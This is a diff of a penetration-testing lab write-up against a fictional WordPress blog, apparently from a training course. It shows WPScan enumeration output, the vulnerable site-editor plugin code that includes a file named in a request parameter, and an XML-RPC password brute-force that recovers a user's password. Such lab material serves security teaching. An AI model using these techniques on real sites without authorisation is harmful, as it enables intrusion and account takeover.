@@ -6,7 +6,7 @@ Now let's put all of the new skills we have learned into practice. This final sk
 
 ## Scenario
 
-You have been contracted to perform an external penetration test against the companyÂ `INLANEFREIGHT`Â that is hosting one of their main public-facing websites on WordPress.
+You have been contracted to perform an external penetration test against the company`INLANEFREIGHT` that is hosting one of their main public-facing websites on WordPress.
 
 Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.
 
@@ -53,10 +53,10 @@ We get this output:
 ```
 [+] Headers
  | Interesting Entries:
- |  - Server: Apache/2.4.29 (Ubuntu)
- |  - X-TEC-API-VERSION: v1
- |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
- |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
+ | - Server: Apache/2.4.29 (Ubuntu)
+ | - X-TEC-API-VERSION: v1
+ | - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
+ | - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
  | Found By: Headers (Passive Detection)
  | Confidence: 100%
 
@@ -64,11 +64,11 @@ We get this output:
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
  | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+ | - http://codex.wordpress.org/XML-RPC_Pingback_API
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
 [+] WordPress readme found: http://blog.inlanefreight.local/readme.html
  | Found By: Direct Access (Aggressive Detection)
@@ -82,13 +82,13 @@ We get this output:
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
+ | - https://www.iplocation.net/defend-wordpress-from-ddos
+ | - https://github.com/wpscanteam/wpscan/issues/1299
 
 [+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
  | Found By: Rss Generator (Passive Detection)
- |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
- |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
+ | - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
+ | - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 
 [+] WordPress theme in use: twentynineteen
  | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
@@ -106,7 +106,7 @@ We get this output:
  |
  | Version: 1.3 (80% confidence)
  | Found By: Style (Passive Detection)
- |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
+ | - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
 
 [+] Enumerating Vulnerable Plugins (via Passive Methods)
 [+] Checking Plugin Versions (via Passive and Aggressive Methods)
@@ -159,16 +159,16 @@ We get this output:
 [+] erika
  | Found By: Author Posts - Display Name (Passive Detection)
  | Confirmed By:
- |  Rss Generator (Passive Detection)
- |  Author Id Brute Forcing - Display Name (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
+ | Rss Generator (Passive Detection)
+ | Author Id Brute Forcing - Display Name (Aggressive Detection)
+ | Login Error Messages (Aggressive Detection)
 
 [+] admin
  | Found By: Author Posts - Display Name (Passive Detection)
  | Confirmed By:
- |  Rss Generator (Passive Detection)
- |  Author Id Brute Forcing - Display Name (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
+ | Rss Generator (Passive Detection)
+ | Author Id Brute Forcing - Display Name (Aggressive Detection)
+ | Login Error Messages (Aggressive Detection)
 
 [+] Charlie Wiggins
  | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
@@ -193,10 +193,10 @@ We get this:
 ```
 [+] Headers
  | Interesting Entries:
- |  - Server: Apache/2.4.29 (Ubuntu)
- |  - X-TEC-API-VERSION: v1
- |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
- |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
+ | - Server: Apache/2.4.29 (Ubuntu)
+ | - X-TEC-API-VERSION: v1
+ | - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
+ | - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
  | Found By: Headers (Passive Detection)
  | Confidence: 100%
 
@@ -204,11 +204,11 @@ We get this:
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
  | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+ | - http://codex.wordpress.org/XML-RPC_Pingback_API
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
 [+] WordPress readme found: http://blog.inlanefreight.local/readme.html
  | Found By: Direct Access (Aggressive Detection)
@@ -222,13 +222,13 @@ We get this:
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
  | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
+ | - https://www.iplocation.net/defend-wordpress-from-ddos
+ | - https://github.com/wpscanteam/wpscan/issues/1299
 
 [+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
  | Found By: Rss Generator (Passive Detection)
- |  - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
- |  - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
+ | - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
+ | - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.1.6</generator>
 
 [+] WordPress theme in use: twentynineteen
  | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
@@ -246,7 +246,7 @@ We get this:
  |
  | Version: 1.3 (80% confidence)
  | Found By: Style (Passive Detection)
- |  - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
+ | - http://blog.inlanefreight.local/wp-content/themes/twentynineteen/style.css?ver=1.3, Match: 'Version: 1.3'
 
 [+] Enumerating All Plugins (via Passive Methods)
 [+] Checking Plugin Versions (via Passive and Aggressive Methods)
@@ -262,9 +262,9 @@ We get this:
  |
  | Version: 4.2.2 (100% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 
 [+] site-editor
  | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
@@ -275,7 +275,7 @@ We get this:
  |
  | Version: 1.1.1 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
 
 [+] the-events-calendar
  | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
@@ -286,7 +286,7 @@ We get this:
  |
  | Version: 5.1.2.1 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
 ```
 
 Now, if we go to:
@@ -325,9 +325,9 @@ Now, in order to download the file using the vulnerable plugin, we need to analy
  |
  | Version: 4.2.2 (100% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
  | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/email-subscribers/readme.txt
 
 [+] site-editor
  | Location: http://blog.inlanefreight.local/wp-content/plugins/site-editor/
@@ -338,7 +338,7 @@ Now, in order to download the file using the vulnerable plugin, we need to analy
  |
  | Version: 1.1.1 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/site-editor/readme.txt
 
 [+] the-events-calendar
  | Location: http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/
@@ -349,7 +349,7 @@ Now, in order to download the file using the vulnerable plugin, we need to analy
  |
  | Version: 5.1.2.1 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
- |  - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
+ | - http://blog.inlanefreight.local/wp-content/plugins/the-events-calendar/readme.txt
 ```
 
 We have 3 plugins:
@@ -442,7 +442,7 @@ In site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
 
 Vulnerable code:
 if( isset( $_REQUEST['ajax_path'] ) && is_file( $_REQUEST['ajax_path'] ) && file_exists( $_REQUEST['ajax_path'] ) ){
-    require_once $_REQUEST['ajax_path'];
+ require_once $_REQUEST['ajax_path'];
 }
 
 https://plugins.trac.wordpress.org/browser/site-editor/trunk/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?rev=1640500#L5
@@ -543,8 +543,8 @@ We get the following:
 
 ```
 [+] Performing password attack on Xmlrpc against 1 user/s
-[SUCCESS] - erika / 010203                                                                             
-Trying erika / kitkat Time: 00:00:20 <                         > (700 / 14345092)  0.00%  ETA: ??:??:??
+[SUCCESS] - erika / 010203 
+Trying erika / kitkat Time: 00:00:20 < > (700 / 14345092) 0.00% ETA: ??:??:??
 
 [!] Valid Combinations Found:
  | Username: erika, Password: 010203
